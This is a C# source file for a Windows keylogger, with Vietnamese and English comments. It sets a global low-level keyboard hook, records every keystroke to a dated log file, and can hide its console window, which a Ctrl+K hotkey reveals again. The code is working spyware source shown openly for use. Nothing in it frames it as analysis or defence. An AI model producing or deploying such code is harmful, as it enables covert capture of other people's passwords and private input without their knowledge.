using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

namespace WindowsFormsApplication1
{
    class KeyLogger
    {
        #region hook key board
        //mã khi nhấn phím lên mã 13
        //hook enables you to monitor keyboard input events about to be posted in a thread input queue.
        //truyền vào những hàm ở dưới, mã khi nhấn nút mà up lên là 13, thư viện user32 sẽ nhận các mã và thực hiện các sự kiện tương ứng
        //khi truyền mã 13 thì thư viện sẽ hiểu là lấy những phím nào vừa mới nhả phím ra
        //còn mã 0x0100 là lấy những phím nào vừa nhấn xuống thư viện sẽ tự trả lại
        private const int WH_KEYBOARD_LL = 13;
        //mã khi đè phím xuốn
        private const int WM_KEYDOWN = 0x0100;
        //delegate 
        private static LowLevelKeyboardProc _proc = HookCallback;
        //bất kì 1 cửa sổ/controll/menu đều có 1 handle cái handle là cái id của những thằng đó trong hệ điều hành
        //hdh chạy rất nhiều cửa sổ/controll 
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        //
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            //lấy tất cả các process,
            using (Process curProcess = Process.GetCurrentProcess())
            {
                //truy từng chương trình chính
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    //thực hiện thả mồi câu xuống cửa sổ, lấy ra những module handle của chương trình chính đó
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then call the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //kiểm tra có trả về không, kiểm tra có phải keydown ko
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                //marshal lấy dữ liệu ra nhưmh không nuốt luôn
                int vkCode = Marshal.ReadInt32(lParam);
                SetHotKey(vkCode);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;
        #endregion

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }

        static bool isShowing = false;
        static Keys preciousKey = Keys.Separator;
        static void SetHotKey(int vkCode)
        {
            if ((preciousKey == Keys.LControlKey || preciousKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
            {
                if (isShowing)
                {
                    HideWindow();
                }
                else
                {
                    DisplayWindow();
                }
                isShowing = !isShowing;
            }
            preciousKey = (Keys)vkCode;
        }
        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            System.Windows.Forms.Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        #endregion

        public KeyLogger()
        {
            //HideWindow();
            HookKeyboard();
        }
    }
}
